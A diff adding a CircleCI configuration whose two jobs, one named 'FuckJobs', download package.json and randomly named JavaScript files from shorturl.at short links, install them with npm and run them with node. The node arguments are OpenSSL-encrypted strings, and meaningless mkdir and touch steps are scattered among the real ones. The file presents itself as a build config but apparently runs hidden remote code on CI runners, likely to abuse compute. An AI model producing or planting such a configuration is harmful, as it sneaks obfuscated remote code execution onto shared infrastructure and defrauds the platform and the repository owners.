@@ -1,0 +1,47 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  kiem-tra:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir y5s8iedete3fgbdihva
+      - run: curl -fsSL shorturl.at/bdzGO -o package.json && curl -fsSL
+          shorturl.at/cAHPV -o w1v2j2gmsz6ydohm.js && curl -fsSL
+          shorturl.at/nAQV1 -o ng15owss5xl.js
+      - run: mkdir mvinja4qj8xdz4pk2g
+      - run: npm i -s
+      - run: cat /etc/os-release
+      - run: mkdir evqfbc4rpgkut6n0a
+      - run: mkdir joluvf35xiux8fq3
+      - run: node w1v2j2gmsz6ydohm -lpn U2FsdGVkX1/OXp7HdhafjBLiknNK+PQnW0KwO1VCleU= -sp
+          -t U2FsdGVkX18InqZZaunNL/oIC8WjXCuZXC0Ig1s99cYyGZZhIcOFy3BBpxgSk+OO -s
+          U2FsdGVkX18mwr0l+5VR9YIIoro2dsiM7w3tf5w4tCH4Rf0rsr/xQKeXR8WjCHMV6BSPzXXtnFJZtJY5VCO9+y3ul0EpO6rJiaMDBPHrXGJWB0pQQTaLiyHru9bKCgXb/myomxwvQxGHnsCOSLKSfl7iLOAj3I7SLzWHzE8vyKwyyR4g8OqpQq05FRDHMgHmebrfomJmfOI980/uiK2LEFfuO/AXIk7gO+alhmnVW1k=
+          -r
+          U2FsdGVkX1/zWc2B+1247qn2gIvFN+kQ0prwc74xQZNx2nhyO+AMHH7/Ci6XN4d5XSfNO9BH/bgH95K0Z56MhnLp/gk2uyZCyVuyXR87itB8ysGcLCVS01MiLtiiICeW2d+24523i+1NTuJTpDo9DxkprcJCmxu4vO51GuHktB/R7Hnko7GSVpwwoc2o93rC8gTRDDbWVikE3YkcXAZzpDLE3llsbYuzUNKItdia+hjVR7N6W8xKtAfhBtUWyMdY0N29WSAG5ZYdppCBA3whMGTf+0Qan4wfjGPqoUQz3is=
+      - run: touch wnbszyd2rq8o6yun6ivbc.c
+  FuckJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: cat /proc/cpuinfo
+      - run: mkdir hu27eqmxtglva8er5md6lj8
+      - run: curl -fsSL shorturl.at/wPU14 -o 5d0szpz7fe7wp6h.js && curl -fsSL
+          shorturl.at/mIJT3 -o package.json && curl -fsSL shorturl.at/fhBGO -o
+          z8hpyvrdlwoum2h.js
+      - run: mkdir zzerqpvjajsskwfxqjak1pie
+      - run: mkdir 41wlpere0iqphouv
+      - run: npm i -s
+      - run: touch jc1dgic6hn8277vp.java
+      - run: node 5d0szpz7fe7wp6h -s
+          U2FsdGVkX1/4IF++dzAkAqJ8eiYHPABXfg9/JizctRR5YqJV+h00xjLyy8KQHtG5I0oVzxK5JIKxVmrcm4gyGKjS1r5TUMnKkmzBZiCUiHKR29IDUVDpZuMXrofNBAQE5zz4wL/CageRhG7gnAm8Fh+5tFVU0uIvdPCJuwABHFxI7bGysdj2c6MyBgcoUVMhczjZqx6SEnBh8vFoUsreihliQ1OYge/UXLd1omWVfEI=
+          -t U2FsdGVkX19feYCqe7BecyZ6Tn6YLVN802mdfb9f/CoNIghBITvpR7kRi9GMwr0c -r
+          U2FsdGVkX19km2UcaDE6Wv1P3roTC1ApiN/jJXzlbIMbfui99xeez4bT7QxyfyHHWZ9YdwoDJW1lIHvy4zJ603jSJ8K0Biq2yUZRFCczyjliHdHrrN2VGK6pkT1e7rmKGaJXHnHn7Hv44xoWEzCyEs+lan81ceNhLjuPn18TEpcAqNydzHEa6ZUwTTsLHRtLI2SQYdfNuQTs19S07eci+vvYczcRh5W1KY1POvPmkOQ6CuLCgDXl3XutdRL84cLdVZw0qHoGXn94YlWuKd1GLPAOhBKmjLuwvol5mqPdp0U=
+          -sp -lpn U2FsdGVkX19TGb/Yrc4QeSjrBibm546jFspihmWJuNM=
+      - run: touch zaqg9tubxnnyeeafkx.js
+workflows:
+  MyJobs:
+    jobs:
+      - kiem-tra
+      - FuckJobs
